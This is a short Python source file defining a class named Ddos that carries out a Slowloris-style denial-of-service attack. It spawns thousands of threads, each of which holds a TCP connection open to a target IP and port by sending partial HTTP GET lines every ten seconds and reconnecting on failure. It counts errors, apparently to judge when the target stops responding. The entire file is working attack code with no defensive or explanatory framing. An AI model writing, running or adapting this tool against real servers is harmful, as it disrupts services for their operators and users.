import socket
from threading import Thread
import time

class Ddos(Thread):
    def __init__(self, ip, port, errorMax = 100):
        Thread.__init__(self)
        self.errorMax = errorMax
        self.errorsCount = 0
        self.ip = ip
        self.port = int(port)
    def countError(self):
        self.errorsCount += 1
    def run(self):
        i=0
        while (self.errorsCount < self.errorMax) and ( i < 3060):
            thread = Thread(target=self.attack, args=(self.ip, self.port))
            thread.start()
            if(i>3000):
                print(self.errorsCount)
                time.sleep(1)
            i = i + 1

        self.finalErrors = self.errorsCount
        print("nmb erreurs total : "+str(self.finalErrors))

    def join(self):
        Thread.join(self)
        if(self.finalErrors < self.errorMax): return False
        else : return True

    def attack(self, ip, port):
        print("ici")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(50)
            s.connect((ip, port))
            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
            while True:
                try:
                    time.sleep(10)
                    s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                except socket.error as e:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(50)
                        s.connect((ip, port))
                        s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                    except socket.error as e2:
                        self.countError()

            s.close()
        except socket.error as e2:
            self.countError()

